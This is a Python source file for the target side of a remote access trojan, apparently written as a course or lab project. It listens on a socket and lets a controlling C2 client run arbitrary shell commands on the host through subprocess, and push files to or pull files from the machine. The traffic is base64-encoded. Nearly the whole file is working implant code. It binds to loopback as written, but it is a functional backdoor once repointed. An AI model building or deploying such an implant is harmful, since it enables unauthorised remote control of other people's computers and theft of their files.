#!/usr/bin/python3

# Purpose: RAT Target. This script will provide an interface where the client (C2 server) will receive, upload, and control the target with OS level commands.
# Author: Israel Fernandez
# Date of creation: April 7, 2026

# Deliverables: Upload, Download, Execute

import base64
import socket
import struct
import subprocess



HOST = "127.0.0.1"  # Loopback
PORT = 9000  # Port to listen on (non-privileged ports are > 1023)
HEADER_SIZE = 4  # 4-byte unsigned int for message length prefix

class CMD:
    MSG      = b'\x00'
    EXECUTE  = b'\x01'
    UPLOAD   = b'\x02'
    DOWNLOAD = b'\x03'
    SUCCESS  = b'\x04'

# This is taken from https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def warn(msg):
    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")

def err(msg):
    print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")

def success(msg):
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")

def log(msg):
    print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")



def encode(b):
    res = base64.b64encode(b)
    return res

def decode(b):
    res = base64.b64decode(b)
    return res

def connect():
    listener = None
    try:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((HOST, PORT))
        listener.listen(1)
        log(f"Listening for connection...")
        try:
            conn, addr = listener.accept()
        except OSError as e:
            err(f"Error accepting connection: {e}")
            return None
        success(f"Connected by {addr}")
        return (conn, addr)
    except socket.error as e:
        err(f"Socket creation failed: {e}")
        return None
    finally:
        if listener:
            listener.close()

def disconnect(session):
    conn, _ = session
    try:
        conn.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    conn.close()

def send(command, payload, session):
    if payload is None or session is None:
        return -1
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    if not isinstance(payload, (bytes, bytearray)):
        err(f"Payload must be bytes or str, got {type(payload).__name__}")
        return -1
    if not isinstance(command, (bytes, bytearray)) or len(command) != 1:
        err(f"Command must be exactly 1 byte, got {command!r}")
        return -1
    conn, addr = session
    message = command + payload
    length = struct.pack(">I", len(message))
    conn.sendall(length + message)
    log(f"Sent command {command.hex()} ({len(payload)} bytes) to {addr}")
    return 0

def recv(session):
    _, addr = session
    raw_length = _receive_all(session, HEADER_SIZE)
    if raw_length is None:
        return None
    length = struct.unpack(">I", raw_length)[0]
    log(f"Expecting {length} bytes from {addr}")
    
    data = _receive_all(session, length)
    if data is None or len(data) < 1:
        return None

    command = data[0:1]
    payload = data[1:]

    log(f"Received command {command.hex()} ({len(payload)} bytes) from {addr}")

    return (command, payload)

def _receive_all(session, length):
    if session is None:
        return None
    conn, _ = session
    data = b""
    while len(data) < length:
        chunk = conn.recv(length - len(data))
        if not chunk:
            return None # connection closed mid-message
        data += chunk
    return data


def download(filename, payload, session):
    log(f"Writing to file: {filename}")
    try:
        with open(filename, 'wb') as f:
            f.write(payload)
        success(f"Successfully written {len(payload)}bytes to {filename}")
        return send(CMD.SUCCESS, encode(f"Successfully written {len(payload)}Bytes to {filename} on Server".encode('utf-8')), session)

    except OSError as e:
        err(f"Failed to write {filename}: {e}")
        return send(CMD.SUCCESS, encode(f"Failed to write {filename} to Server: {e}".encode('utf-8')), session)

def upload(filename, session):
    _, addr = session
    log(f"Sending {filename} to {addr}")
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        success(f"Successfully sent {filename} ({len(data)}Bytes)")
        return send(CMD.MSG, encode(data), session)
    except OSError as e:
        err(f"Failed to send {filename}: {e}")
        return send(CMD.MSG, encode(f"Failed to send {filename} to Server: {e}".encode('utf-8')), session)

def execute(payload, session):
    log(f"Executing {payload}...")
    try:
        res = subprocess.run(payload.decode('utf-8').split(" "), capture_output=True, text=True)
        output = (res.stdout + res.stderr).encode('utf-8')
        success(f"Successfully executed {payload}...")
        return send(CMD.SUCCESS, encode(output), session)
    except OSError as e:
        err(f"Failed to execute {payload}: {e}")
        return send(CMD.MSG, encode(f"Failed to execute {payload} on Server: {e}".encode('utf-8')), session)



def main():
    log(f"Starting RAT...")
    while True:
        session = connect()
        if session is None:
            err("Connection failed, retrying...")
            continue
        try:
            result = recv(session)
            if result is None:
                err("Failed to receive data")
                disconnect(session)
                continue
            command, payload = result
            payload = decode(payload)
            match command:
                case CMD.DOWNLOAD:
                    if upload(payload, session) != 0:
                        err(f"Errored out...")
                    continue
                case CMD.UPLOAD:
                    filename = payload.decode('utf-8')
                    result = recv(session)
                    if result is None:
                        err("Failed to receive data")
                        disconnect(session)
                        continue
                    command, payload = result
                    if download(filename, payload, session) != 0:
                        err("Failed to download file from Client")
                        continue
                case CMD.EXECUTE:
                    if execute(payload, session) != 0:
                        err(f"Failed to execute {payload}")
                    continue
                case _:
                    log(f"Received {payload}...")

        except KeyboardInterrupt:
            warn(f"Stopping Server...")
            disconnect(session)

    

if __name__ == "__main__":
    main()

